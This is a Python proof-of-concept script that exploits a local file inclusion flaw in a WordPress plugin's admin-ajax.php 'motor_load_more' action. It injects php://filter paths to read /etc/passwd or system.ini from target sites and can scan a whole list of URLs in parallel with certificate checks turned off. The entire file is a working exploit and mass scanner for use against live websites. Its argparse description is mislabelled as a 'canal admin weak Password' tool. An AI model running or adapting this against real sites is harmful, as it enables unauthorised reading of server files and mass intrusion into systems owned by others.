# -*- coding: utf-8 -*-
import argparse
import base64
import re
import sys
from multiprocessing.dummy import Pool

import requests
import urllib3
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def banner():
    test = """
           8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
            Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
             Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
              "8aa8"      88           88,d88'      88 88  `8b   88 88             
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
                88        88           88     "88,  88 88     `888   `"Y88888P"   

                            888888888888 

                            tag: this is a wordpress admin-ajax.php 文件包含漏洞 poc                                       
                                        @version: 1.0.3   @author: Y1_K1NG           
    """
    print(test)


def poc(target):
    if target[-1] == '/':
        target = target
    else:
        target = target + "/"
    url = target + 'wp-admin/admin-ajax.php'
    payload = "----------1958124369\r\n" \
              "Content-Disposition: form-data; name=\"action\"\r\n" \
              "\r\n" \
              "motor_load_more\r\n" \
              "----------1958124369\r\n" \
              "Content-Disposition: form-data; name=\"file\"\r\n" \
              "\r\n" \
              "php://filter/resource={{lfi}}\r\n" \
              "----------1958124369--"

    lfi_paths = [
        "C:\\Windows\\system.ini",
        "/etc/passwd"
    ]

    for lfi_path in lfi_paths:
        data = payload.replace("{{lfi}}", lfi_path)
        headers = {
            "Content-Type": "multipart/form-data; boundary=--------1958124369",
            "User-Agent": "Mozilla/5.0"
        }
        try:
            response = requests.post(url, headers=headers, verify=False, timeout=15, data=data)
            # print(response.request.body)
            # print(response.content)
            if (response.status_code == 200 and ("root:x" in response.text)) or (
                    response.status_code == 200 and ("for 16-bit app support" in response.text)):
                print(f"[+] {target} 存在 LFI 漏洞")
            else:
                print(f"[-] {target} 未发现 LFI 漏洞")
        except Exception as e:
            print(f"[*] {target} error: {str(e)}")


def extract_host(url):
    """
    从 URL 中提取主机地址和端口号，返回 (host, port)
    """
    match = re.search(r"(http://|https://)?([\w\.]+):?(\d+)?", url)
    if match:
        prefix, host, port = match.groups()
        if not port:
            if prefix and "https" in prefix:
                port = "443"
            else:
                port = "80"
        return host, int(port)
    else:
        return None, None


def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()

    if args.url and not args.file:
        if "https://" in args.url or "http://" in args.url:
            url = args.url
        else:
            host, port = extract_host(args.url)
            url = f"http://{host}:{port}"
        poc(url)

    elif args.url is None and args.file is not None:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip().replace("\n", "")
                if "https://" in url or "http://" in url:
                    url = url
                else:
                    host, port = extract_host(url)
                    url = f"http://{host}:{port}"
                url_list.append(url)

        pool = Pool(10)
        pool.map(poc, url_list)
        pool.close()
        pool.join()

    else:
        parser.print_help()


if __name__ == '__main__':
    main()
